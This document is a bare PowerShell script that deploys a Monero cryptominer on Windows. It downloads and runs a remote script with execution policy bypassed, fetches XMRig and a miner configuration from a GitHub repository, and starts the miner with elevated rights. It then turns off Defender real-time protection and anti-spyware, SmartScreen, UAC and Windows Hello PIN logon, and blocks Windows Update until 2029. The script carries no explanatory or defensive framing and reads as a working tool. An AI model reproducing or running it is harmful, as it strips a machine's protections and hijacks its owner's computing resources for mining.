Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1" -OutFile "C:\configure_system.ps1"
powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'
Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip
& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'
Start-Sleep -Seconds 3
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/ZEPHSETUP.rar -OutFile C:\ZEPHSETUP.rar
& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\ZEPHSETUP.rar' 'C:\'
Start-Sleep -Seconds 2
Copy-Item -Path C:\ZEPHYRUN.bat -Destination C:\xmrig-6.22.2\ZEPHYRUN.bat -Force
Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
Start-Process -FilePath 'C:\xmrig-6.22.2\ZEPHYRUN.bat' -ArgumentList '/S' -Verb RunAs
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0
Set-MpPreference -DisableRealtimeMonitoring $true
Stop-Service -Name wuauserv -Force
Set-Service -Name wuauserv -StartupType Disabled
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '0'
Set-Service -Name wuauserv -StartupType Disabled
$pause = (Get-Date).AddDays(35)
$pause = $pause.ToUniversalTime().ToString( "2029-07-31T00:00:00Z" )
$pause_start = (Get-Date)
$pause_start = $pause_start.ToUniversalTime().ToString( "yyyy-MM-ddTHH:mm:ssZ" )
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesExpiryTime' -Value $pause                        
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesStartTime' -Value $pause_start
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseFeatureUpdatesEndTime' -Value $pause
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesStartTime' -Value $pause_start
Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseQualityUpdatesEndTime' -Value $pause
Set-itemproperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings' -Name 'PauseUpdatesStartTime' -Value $pause_start
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Force
New-ItemProperty -Path  'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'NoAutoUpdate' -PropertyType DWORD -Value 1
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
Set-MpPreference -DisableRealtimeMonitoring $true
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device" /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2
Set-MpPreference -DisableRealtimeMonitoring $true
exit
